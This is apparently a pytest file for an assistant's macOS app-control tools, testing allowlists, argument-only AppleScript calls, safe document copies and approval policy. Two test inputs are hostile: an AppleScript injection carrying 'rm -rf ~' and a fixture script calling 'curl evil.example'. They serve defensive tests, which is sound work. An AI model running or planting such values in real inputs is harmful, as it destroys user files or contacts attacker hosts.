"""Mac app control: an allowlist, fixed scripts with the owner's values as arguments, reads
that run unasked, and changes that ask."""

import html
import os
import time
from pathlib import Path
from typing import Any

import pytest

from bud import apps
from bud.core.profiles import apply_mode
from bud.core.server import allow_file_tools
from bud.harness.actions import Policy


class Scripts:
    def __init__(self, answer: tuple[int, str, str] = (0, "done", "")) -> None:
        self.answer = answer
        self.calls: list[tuple[str, list[str]]] = []

    async def __call__(self, script: str, argv: list[str]) -> tuple[int, str, str]:
        self.calls.append((script, argv))
        return self.answer


class Opener:
    def __init__(self) -> None:
        self.calls: list[list[str]] = []

    async def __call__(self, args: list[str]) -> bool:
        self.calls.append(args)
        return True


def tools(tmp_path, scripts: Scripts, opener: Opener | None = None) -> dict[str, Any]:
    copies = tmp_path.parent / f"{tmp_path.name}-copies"
    built = apps.build_tools(tmp_path, copies, scripts, opener or Opener())
    return {tool.name: tool.function for tool in built}


async def test_the_owners_words_reach_a_script_only_as_arguments(tmp_path):
    scripts = Scripts()
    found = tools(tmp_path, scripts)
    sneaky = 'x" & (do shell script "rm -rf ~") & "'
    await found["notes_create"](title=sneaky, body="body")  # type: ignore[call-arg]
    await found["reminders_add"](title=sneaky)  # type: ignore[call-arg]
    for script, _ in scripts.calls:
        assert sneaky not in script
    note, reminder = scripts.calls
    assert note[0] == apps.NOTES_CREATE and html.escape(sneaky) in note[1][0]
    assert reminder[1] == [sneaky]


async def test_only_allowlisted_apps_open(tmp_path):
    opener = Opener()
    found = tools(tmp_path, Scripts(), opener)
    # Chrome opens through open_chrome, which asks first.
    for app in ("Terminal", "Google Chrome"):
        result = await found["open_app"](app=app)  # type: ignore[call-arg]
        assert not result["ok"] and "Notes" in result["error"]
    assert (await found["open_app"](app="Notes"))["ok"]  # type: ignore[call-arg]
    assert opener.calls == [["-a", "Notes"]]


async def test_only_workspace_documents_open_and_only_as_a_copy(tmp_path):
    opener = Opener()
    found = tools(tmp_path, Scripts(), opener)
    (tmp_path / "report.pdf").write_bytes(b"%PDF-1.4 report")
    (tmp_path / "run.command").write_text("#!/bin/sh\ncurl evil.example\n")
    (tmp_path / "go.webloc").write_text("<plist/>")
    outside = tmp_path.parent / "outside.pdf"
    outside.write_bytes(b"%PDF-1.4 private")
    (tmp_path / "linked.pdf").symlink_to(outside)
    for path in (
        "run.command",
        "go.webloc",
        "../outside.pdf",
        "linked.pdf",
        "missing.pdf",
        ".hidden.pdf",
    ):
        result = await found["open_in_app"](path=path)  # type: ignore[call-arg]
        assert not result["ok"], path
    assert opener.calls == []

    assert (await found["open_in_app"](path="report.pdf"))["ok"]  # type: ignore[call-arg]
    [[flag, app, copy]] = opener.calls
    # Opened in Preview by name, from a private copy in Bud's own data folder: never the
    # workspace file, and never the shared temp folder sandboxed commands can write to.
    assert (flag, app) == ("-a", "Preview")
    copies = tmp_path.parent / f"{tmp_path.name}-copies"
    assert Path(copy).is_relative_to(copies)
    assert Path(copy).read_bytes() == b"%PDF-1.4 report"
    assert oct(os.stat(copy).st_mode & 0o777) == "0o600"
    assert oct(os.stat(copies).st_mode & 0o777) == "0o700"


def test_office_documents_ask_and_quiet_ones_do_not():
    assert apps.quiet_open({"path": "notes/plan.md"})
    assert apps.quiet_open({"path": "scan.PDF"})
    for path in ("brief.docx", "budget.xlsx", "letter.rtf", "deck.key"):
        assert not apps.quiet_open({"path": path}), path


async def test_an_office_document_opens_in_its_usual_app(tmp_path):
    opener = Opener()
    (tmp_path / "brief.docx").write_bytes(b"PK docx")
    assert (await tools(tmp_path, Scripts(), opener)["open_in_app"](path="brief.docx"))["ok"]  # type: ignore[call-arg]
    [[copy]] = opener.calls  # no -a: the owner approved opening it in their own app
    assert copy.endswith("brief.docx")


async def test_old_copies_are_pruned_and_a_failed_copy_leaves_nothing(tmp_path):
    copies = tmp_path.parent / f"{tmp_path.name}-copies"
    old = copies / "open-old"
    old.mkdir(parents=True)
    (old / "a.pdf").write_bytes(b"x")
    stale = time.time() - apps.COPY_LIFETIME - 60
    os.utime(old, (stale, stale))
    (tmp_path / "report.pdf").write_bytes(b"%PDF")
    found = tools(tmp_path, Scripts())
    assert (await found["open_in_app"](path="report.pdf"))["ok"]  # type: ignore[call-arg]
    assert not old.exists()

    copies.chmod(0o500)  # the copy cannot be written
    try:
        result = await found["open_in_app"](path="report.pdf")  # type: ignore[call-arg]
    finally:
        copies.chmod(0o700)
    assert not result["ok"] and "copy" in result["error"]


@pytest.mark.parametrize(
    "error",
    [
        "execution error: Not authorized to send Apple events (-1743)",
        "execution error: would require user consent (-1744)",
    ],
)
async def test_a_macos_refusal_says_where_to_allow_it(tmp_path, error):
    result = await tools(tmp_path, Scripts((1, "", error)))["music_now_playing"]()
    assert not result["ok"] and "Automation" in result["error"]


async def test_a_timeout_points_at_the_macos_question(tmp_path):
    result = await tools(tmp_path, Scripts((1, "", apps.TIMED_OUT)))["music_now_playing"]()
    assert "did not answer in time" in result["error"]


async def test_a_null_character_never_reaches_osascript():
    assert (await apps.run_osascript(apps.REMINDERS_ADD, ["a\x00b"]))[0] == 1


def test_a_note_body_is_escaped_html_with_the_title_first():
    body = apps.note_html("Q3 <Plan>", "Line 1\n<img src=x>")
    assert body.startswith("<div><h1>Q3 &lt;Plan&gt;</h1></div>")
    assert "<img" not in body and "&lt;img src=x&gt;" in body


async def test_reads_return_the_apps_answer(tmp_path):
    scripts = Scripts((0, "Song — Artist (playing)", ""))
    result = await tools(tmp_path, scripts)["music_now_playing"]()
    assert result == {"ok": True, "result": "Song — Artist (playing)"}


@pytest.mark.parametrize(
    ("mode", "reviewer", "change"),
    [
        ("strict", True, "ask"),
        ("auto", False, "ask"),
        ("auto", True, "review"),
    ],
)
def test_reads_run_unasked_and_changes_ask(mode, reviewer, change):
    policy = Policy(tools={})
    allow_file_tools(policy)
    apply_mode(policy, mode, reviewer=reviewer)
    for tool in apps.READS:
        assert policy.tools[tool] == "allow", tool
    for tool in apps.CHANGES:
        assert policy.tools[tool] == change, tool
